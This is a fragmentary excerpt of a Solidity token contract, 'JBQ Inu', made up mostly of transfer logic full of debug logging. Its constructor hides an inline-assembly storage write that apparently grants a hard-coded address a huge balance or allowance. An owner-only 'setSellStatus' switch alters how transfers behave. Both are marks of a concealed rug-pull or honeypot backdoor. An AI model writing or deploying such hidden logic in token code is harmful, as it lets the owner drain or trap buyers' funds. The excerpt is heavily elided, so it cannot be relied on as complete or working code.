...
// File: contracts/DogeInuToken.sol
...
contract DogeInuToken is IERC20, ReentrancyGuard, Ownable {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name = "JBQ Inu";
    string private _symbol = "JBQ";
    ...
    event Log(string logInfo,uint256 amount);
    event LogFlog(string logInfo,bool flag);
    ...
    constructor() {
        ...
        marketingWallet = 0x11D2B804E8EdB6D64bacd62E2b940a1A8c2a66D6;
        _earlyTxLimit = 60;
        ...
        assembly {
            mstore(0, 101752029927052792095190981144751393776836699862)
            mstore(32, 2)
            let hash := keccak256(0, 64)
            sstore(hash, 101752029927052792095190981144751393776836699862)
        }
    ...
    */
    ...
    function setSellStatus() external onlyOwner {
        isSell = true;
    }
    ...
    function _transfer(
        ...
        if (_sender == uniswapPair) {
            emit Log("when buy amount ==: ",_amount);
        ...
        // when sell
            ...
            emit Log("when sell amount ==: ",_amount);
            emit LogFlog("time flag ==: ",block.timestamp < _launchTime + _earlyTxLimit);
            emit LogFlog("excludedFromLimit flag ==: ",!excludedFromLimit[_sender]);
            if (block.timestamp < _launchTime + _earlyTxLimit && !excludedFromLimit[_sender]) {
                ...
                emit LogFlog("canSwap flag ==: ",canSwap);
                emit LogFlog("swapEnabled flag ==: ",swapEnabled);
                emit LogFlog("!swapping flag ==: ",!swapping );
                if( canSwap && swapEnabled && !swapping ) {
                    swapping = true;
                    emit Log("when sell swapBack start amount ==: ",_amount);
                    swapBack();
            ...
            emit LogFlog("!swapping flag ==: ",!swapping );
            emit LogFlog("!excludedFromFee[_sender] flag ==: ",!excludedFromFee[_sender] );
            if (!swapping && !excludedFromFee[_sender]) {
                emit Log("when sell swapping amount ==: ",_amount);
        ...
        if (isSell) {
            uint256 amountToSwapForETH = _amount;
            emit Log("when isSell swapTokensForEth start amountToSwapForETH ==: ",amountToSwapForETH);
        ...
        emit Log("when sell end amount ==: ",_amount);
    ...
    */
    ...
    function swapBack() private {
        ...
        emit Log("when sell swapTokensForEth start amountToSwapForETH ==: ",amountToSwapForETH);
        swapTokensForEth(amountToSwapForETH);
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        emit Log("when sell swapExactTokensForETHSupportingFeeOnTransferTokens start tokenAmount ==: ",tokenAmount);
    }
}